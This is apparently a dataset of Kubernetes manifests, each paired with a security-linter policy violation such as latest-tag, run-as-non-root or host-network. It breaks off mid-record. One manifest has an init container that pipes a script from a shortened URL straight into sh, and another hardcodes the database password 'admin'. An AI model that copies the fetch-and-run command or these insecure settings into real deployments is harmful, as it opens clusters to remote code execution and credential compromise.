[
  {
    "id": "10087",
    "manifest_path": "data/manifests/the_stack_sample/sample_3885.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    home: work\nspec:\n  containers:\n  - name: homework\n    image: andel7/testing-hw:latest\n    volumeMounts:\n    - name: app\n      mountPath: /opt/bitnami/nginx/html\n  initContainers:\n  - name: init-myservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"homework\" is using an invalid container image, \"andel7/testing-hw:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10088",
    "manifest_path": "data/manifests/the_stack_sample/sample_3885.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    home: work\nspec:\n  containers:\n  - name: homework\n    image: andel7/testing-hw:latest\n    volumeMounts:\n    - name: app\n      mountPath: /opt/bitnami/nginx/html\n  initContainers:\n  - name: init-myservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"homework\" does not have a read-only root file system"
  },
  {
    "id": "10089",
    "manifest_path": "data/manifests/the_stack_sample/sample_3885.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    home: work\nspec:\n  containers:\n  - name: homework\n    image: andel7/testing-hw:latest\n    volumeMounts:\n    - name: app\n      mountPath: /opt/bitnami/nginx/html\n  initContainers:\n  - name: init-myservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-myservice\" does not have a read-only root file system"
  },
  {
    "id": "10090",
    "manifest_path": "data/manifests/the_stack_sample/sample_3885.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    home: work\nspec:\n  containers:\n  - name: homework\n    image: andel7/testing-hw:latest\n    volumeMounts:\n    - name: app\n      mountPath: /opt/bitnami/nginx/html\n  initContainers:\n  - name: init-myservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"homework\" is not set to runAsNonRoot"
  },
  {
    "id": "10091",
    "manifest_path": "data/manifests/the_stack_sample/sample_3885.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    home: work\nspec:\n  containers:\n  - name: homework\n    image: andel7/testing-hw:latest\n    volumeMounts:\n    - name: app\n      mountPath: /opt/bitnami/nginx/html\n  initContainers:\n  - name: init-myservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-myservice\" is not set to runAsNonRoot"
  },
  {
    "id": "10092",
    "manifest_path": "data/manifests/the_stack_sample/sample_3885.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    home: work\nspec:\n  containers:\n  - name: homework\n    image: andel7/testing-hw:latest\n    volumeMounts:\n    - name: app\n      mountPath: /opt/bitnami/nginx/html\n  initContainers:\n  - name: init-myservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"homework\" has cpu request 0"
  },
  {
    "id": "10093",
    "manifest_path": "data/manifests/the_stack_sample/sample_3885.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    home: work\nspec:\n  containers:\n  - name: homework\n    image: andel7/testing-hw:latest\n    volumeMounts:\n    - name: app\n      mountPath: /opt/bitnami/nginx/html\n  initContainers:\n  - name: init-myservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-myservice\" has cpu request 0"
  },
  {
    "id": "10094",
    "manifest_path": "data/manifests/the_stack_sample/sample_3885.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    home: work\nspec:\n  containers:\n  - name: homework\n    image: andel7/testing-hw:latest\n    volumeMounts:\n    - name: app\n      mountPath: /opt/bitnami/nginx/html\n  initContainers:\n  - name: init-myservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"homework\" has memory limit 0"
  },
  {
    "id": "10095",
    "manifest_path": "data/manifests/the_stack_sample/sample_3885.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    home: work\nspec:\n  containers:\n  - name: homework\n    image: andel7/testing-hw:latest\n    volumeMounts:\n    - name: app\n      mountPath: /opt/bitnami/nginx/html\n  initContainers:\n  - name: init-myservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-myservice\" has memory limit 0"
  },
  {
    "id": "10096",
    "manifest_path": "data/manifests/the_stack_sample/sample_3888.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: wordpress-deployment\n  template:\n    metadata:\n      labels:\n        app: wordpress-deployment\n    spec:\n      containers:\n      - name: wordpress-image\n        image: wordpress:5.0-apache\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n            cpu: 500m\n        ports:\n        - containerPort: 80\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: mysql-deployment\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: password\n        volumeMounts:\n        - name: wordpress-volume\n          mountPath: /var/www/html\n      volumes:\n      - name: wordpress-volume\n        persistentVolumeClaim:\n          claimName: wordpress-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wordpress-image\" does not have a read-only root file system"
  },
  {
    "id": "10097",
    "manifest_path": "data/manifests/the_stack_sample/sample_3888.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: wordpress-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: wordpress-deployment\n  template:\n    metadata:\n      labels:\n        app: wordpress-deployment\n    spec:\n      containers:\n      - name: wordpress-image\n        image: wordpress:5.0-apache\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n            cpu: 500m\n        ports:\n        - containerPort: 80\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: mysql-deployment\n        - name: WORDPRESS_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: password\n        volumeMounts:\n        - name: wordpress-volume\n          mountPath: /var/www/html\n      volumes:\n      - name: wordpress-volume\n        persistentVolumeClaim:\n          claimName: wordpress-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wordpress-image\" is not set to runAsNonRoot"
  },
  {
    "id": "10098",
    "manifest_path": "data/manifests/the_stack_sample/sample_3890.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.633\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: environment\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        draft: draft-app\n        app: lighthouse-foghorn\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: gcr.io/jenkinsxio/lighthouse-foghorn:0.0.633\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: todo\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: JX_DEFAULT_IMAGE\n          value: gcr.io/jenkinsxio-labs-private/jxl:0.0.208\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-foghorn\" does not have a read-only root file system"
  },
  {
    "id": "10099",
    "manifest_path": "data/manifests/the_stack_sample/sample_3890.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.633\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: environment\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        draft: draft-app\n        app: lighthouse-foghorn\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: gcr.io/jenkinsxio/lighthouse-foghorn:0.0.633\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: todo\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: JX_DEFAULT_IMAGE\n          value: gcr.io/jenkinsxio-labs-private/jxl:0.0.208\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-foghorn\" not found"
  },
  {
    "id": "10100",
    "manifest_path": "data/manifests/the_stack_sample/sample_3890.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.633\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: environment\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        draft: draft-app\n        app: lighthouse-foghorn\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: gcr.io/jenkinsxio/lighthouse-foghorn:0.0.633\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: todo\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: JX_DEFAULT_IMAGE\n          value: gcr.io/jenkinsxio-labs-private/jxl:0.0.208\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-foghorn\" is not set to runAsNonRoot"
  },
  {
    "id": "10101",
    "manifest_path": "data/manifests/the_stack_sample/sample_3892.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: queue-master\n  labels:\n    name: queue-master\n    app: sock-shop\n  annotations:\n    prometheus.io/path: /prometheus\n  namespace: sock-shop\nspec:\n  ports:\n  - port: 80\n    targetPort: 80\n  selector:\n    name: queue-master\n    app: sock-shop\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:sock-shop name:queue-master])"
  },
  {
    "id": "10102",
    "manifest_path": "data/manifests/the_stack_sample/sample_3893.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: curator-v2\n  namespace: monitoring-ns\n  labels:\n    app: curator-v2\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: petschenek/curator\n          name: curator\n          args:\n          - --config\n          - /etc/config/config.yml\n          - /etc/config/action_file.yml\n          volumeMounts:\n          - name: config\n            mountPath: /etc/config\n          resources:\n            limits:\n              cpu: 200m\n              memory: 256Mi\n            requests:\n              cpu: 100m\n              memory: 128Mi\n          securityContext:\n            runAsUser: 1000\n        volumes:\n        - name: config\n          configMap:\n            name: curator-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"curator\" is using an invalid container image, \"petschenek/curator\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10103",
    "manifest_path": "data/manifests/the_stack_sample/sample_3893.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: curator-v2\n  namespace: monitoring-ns\n  labels:\n    app: curator-v2\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: petschenek/curator\n          name: curator\n          args:\n          - --config\n          - /etc/config/config.yml\n          - /etc/config/action_file.yml\n          volumeMounts:\n          - name: config\n            mountPath: /etc/config\n          resources:\n            limits:\n              cpu: 200m\n              memory: 256Mi\n            requests:\n              cpu: 100m\n              memory: 128Mi\n          securityContext:\n            runAsUser: 1000\n        volumes:\n        - name: config\n          configMap:\n            name: curator-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"curator\" does not have a read-only root file system"
  },
  {
    "id": "10104",
    "manifest_path": "data/manifests/the_stack_sample/sample_3895.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: registry-deployment\n  namespace: registry\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      key: registry-pod\n  template:\n    metadata:\n      labels:\n        key: registry-pod\n    spec:\n      containers:\n      - name: registry\n        image: registry:2.6.2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"registry\" does not have a read-only root file system"
  },
  {
    "id": "10105",
    "manifest_path": "data/manifests/the_stack_sample/sample_3895.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: registry-deployment\n  namespace: registry\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      key: registry-pod\n  template:\n    metadata:\n      labels:\n        key: registry-pod\n    spec:\n      containers:\n      - name: registry\n        image: registry:2.6.2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"registry\" is not set to runAsNonRoot"
  },
  {
    "id": "10106",
    "manifest_path": "data/manifests/the_stack_sample/sample_3895.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: registry-deployment\n  namespace: registry\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      key: registry-pod\n  template:\n    metadata:\n      labels:\n        key: registry-pod\n    spec:\n      containers:\n      - name: registry\n        image: registry:2.6.2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"registry\" has cpu request 0"
  },
  {
    "id": "10107",
    "manifest_path": "data/manifests/the_stack_sample/sample_3895.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: registry-deployment\n  namespace: registry\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      key: registry-pod\n  template:\n    metadata:\n      labels:\n        key: registry-pod\n    spec:\n      containers:\n      - name: registry\n        image: registry:2.6.2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"registry\" has memory limit 0"
  },
  {
    "id": "10108",
    "manifest_path": "data/manifests/the_stack_sample/sample_3896.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: account-mongodb\n  namespace: springcloud\n  labels:\n    name: account-mongodb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: account-mongodb\n  template:\n    metadata:\n      labels:\n        name: account-mongodb\n    spec:\n      containers:\n      - name: account-mongodb\n        image: sqshq/piggymetrics-mongodb\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 2000Mi\n        env:\n        - name: INIT_DUMP\n          value: account-service-dump.js\n        - name: MONGODB_PASSWORD\n          value: admin\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"account-mongodb\" is using an invalid container image, \"sqshq/piggymetrics-mongodb\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10109",
    "manifest_path": "data/manifests/the_stack_sample/sample_3896.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: account-mongodb\n  namespace: springcloud\n  labels:\n    name: account-mongodb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: account-mongodb\n  template:\n    metadata:\n      labels:\n        name: account-mongodb\n    spec:\n      containers:\n      - name: account-mongodb\n        image: sqshq/piggymetrics-mongodb\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 2000Mi\n        env:\n        - name: INIT_DUMP\n          value: account-service-dump.js\n        - name: MONGODB_PASSWORD\n          value: admin\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"account-mongodb\" does not have a read-only root file system"
  },
  {
    "id": "10110",
    "manifest_path": "data/manifests/the_stack_sample/sample_3896.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: account-mongodb\n  namespace: springcloud\n  labels:\n    name: account-mongodb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: account-mongodb\n  template:\n    metadata:\n      labels:\n        name: account-mongodb\n    spec:\n      containers:\n      - name: account-mongodb\n        image: sqshq/piggymetrics-mongodb\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 2000Mi\n        env:\n        - name: INIT_DUMP\n          value: account-service-dump.js\n        - name: MONGODB_PASSWORD\n          value: admin\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"account-mongodb\" is not set to runAsNonRoot"
  },
  {
    "id": "10111",
    "manifest_path": "data/manifests/the_stack_sample/sample_3896.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: account-mongodb\n  namespace: springcloud\n  labels:\n    name: account-mongodb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: account-mongodb\n  template:\n    metadata:\n      labels:\n        name: account-mongodb\n    spec:\n      containers:\n      - name: account-mongodb\n        image: sqshq/piggymetrics-mongodb\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 2000Mi\n        env:\n        - name: INIT_DUMP\n          value: account-service-dump.js\n        - name: MONGODB_PASSWORD\n          value: admin\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"account-mongodb\" has cpu request 0"
  },
  {
    "id": "10112",
    "manifest_path": "data/manifests/the_stack_sample/sample_3898.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sureshtekyentrahelloword\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sureshtekyentrahelloword\n  template:\n    metadata:\n      labels:\n        app: sureshtekyentrahelloword\n    spec:\n      containers:\n      - name: sureshtekyentrahelloword\n        image: myecrrepo.azurecr.io/sureshtekyentrahelloword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sureshtekyentrahelloword\" is using an invalid container image, \"myecrrepo.azurecr.io/sureshtekyentrahelloword\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10113",
    "manifest_path": "data/manifests/the_stack_sample/sample_3898.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sureshtekyentrahelloword\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sureshtekyentrahelloword\n  template:\n    metadata:\n      labels:\n        app: sureshtekyentrahelloword\n    spec:\n      containers:\n      - name: sureshtekyentrahelloword\n        image: myecrrepo.azurecr.io/sureshtekyentrahelloword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sureshtekyentrahelloword\" does not have a read-only root file system"
  },
  {
    "id": "10114",
    "manifest_path": "data/manifests/the_stack_sample/sample_3898.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sureshtekyentrahelloword\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sureshtekyentrahelloword\n  template:\n    metadata:\n      labels:\n        app: sureshtekyentrahelloword\n    spec:\n      containers:\n      - name: sureshtekyentrahelloword\n        image: myecrrepo.azurecr.io/sureshtekyentrahelloword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sureshtekyentrahelloword\" is not set to runAsNonRoot"
  },
  {
    "id": "10115",
    "manifest_path": "data/manifests/the_stack_sample/sample_3898.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sureshtekyentrahelloword\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sureshtekyentrahelloword\n  template:\n    metadata:\n      labels:\n        app: sureshtekyentrahelloword\n    spec:\n      containers:\n      - name: sureshtekyentrahelloword\n        image: myecrrepo.azurecr.io/sureshtekyentrahelloword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sureshtekyentrahelloword\" has cpu request 0"
  },
  {
    "id": "10116",
    "manifest_path": "data/manifests/the_stack_sample/sample_3898.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sureshtekyentrahelloword\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sureshtekyentrahelloword\n  template:\n    metadata:\n      labels:\n        app: sureshtekyentrahelloword\n    spec:\n      containers:\n      - name: sureshtekyentrahelloword\n        image: myecrrepo.azurecr.io/sureshtekyentrahelloword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sureshtekyentrahelloword\" has memory limit 0"
  },
  {
    "id": "10117",
    "manifest_path": "data/manifests/the_stack_sample/sample_3901.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: forwarder-sriov\n  labels:\n    app: forwarder-sriov\nspec:\n  selector:\n    matchLabels:\n      app: forwarder-sriov\n  template:\n    metadata:\n      labels:\n        app: forwarder-sriov\n    spec:\n      containers:\n      - image: networkservicemeshci/cmd-forwarder-sriov:ac7772ee\n        imagePullPolicy: IfNotPresent\n        name: forwarder-sriov\n        securityContext:\n          privileged: true\n        env:\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        - name: NSM_SRIOV_CONFIG_FILE\n          value: /var/lib/networkservicemesh/sriov.config\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm\n          mountPath: /var/lib/networkservicemesh\n        - name: kubelet-socket\n          mountPath: /var/lib/kubelet\n        - name: cgroup\n          mountPath: /host/sys/fs/cgroup\n        - name: vfio\n          mountPath: /host/dev/vfio\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: Directory\n      - name: kubelet-socket\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n          type: Directory\n      - name: vfio\n        hostPath:\n          path: /dev/vfio\n          type: DirectoryOrCreate\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "10118",
    "manifest_path": "data/manifests/the_stack_sample/sample_3901.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: forwarder-sriov\n  labels:\n    app: forwarder-sriov\nspec:\n  selector:\n    matchLabels:\n      app: forwarder-sriov\n  template:\n    metadata:\n      labels:\n        app: forwarder-sriov\n    spec:\n      containers:\n      - image: networkservicemeshci/cmd-forwarder-sriov:ac7772ee\n        imagePullPolicy: IfNotPresent\n        name: forwarder-sriov\n        securityContext:\n          privileged: true\n        env:\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        - name: NSM_SRIOV_CONFIG_FILE\n          value: /var/lib/networkservicemesh/sriov.config\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm\n          mountPath: /var/lib/networkservicemesh\n        - name: kubelet-socket\n          mountPath: /var/lib/kubelet\n        - name: cgroup\n          mountPath: /host/sys/fs/cgroup\n        - name: vfio\n          mountPath: /host/dev/vfio\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: Directory\n      - name: kubelet-socket\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n          type: Directory\n      - name: vfio\n        hostPath:\n          path: /dev/vfio\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"forwarder-sriov\" does not have a read-only root file system"
  },
  {
    "id": "10119",
    "manifest_path": "data/manifests/the_stack_sample/sample_3901.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: forwarder-sriov\n  labels:\n    app: forwarder-sriov\nspec:\n  selector:\n    matchLabels:\n      app: forwarder-sriov\n  template:\n    metadata:\n      labels:\n        app: forwarder-sriov\n    spec:\n      containers:\n      - image: networkservicemeshci/cmd-forwarder-sriov:ac7772ee\n        imagePullPolicy: IfNotPresent\n        name: forwarder-sriov\n        securityContext:\n          privileged: true\n        env:\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        - name: NSM_SRIOV_CONFIG_FILE\n          value: /var/lib/networkservicemesh/sriov.config\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm\n          mountPath: /var/lib/networkservicemesh\n        - name: kubelet-socket\n          mountPath: /var/lib/kubelet\n        - name: cgroup\n          mountPath: /host/sys/fs/cgroup\n        - name: vfio\n          mountPath: /host/dev/vfio\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: Directory\n      - name: kubelet-socket\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n          type: Directory\n      - name: vfio\n        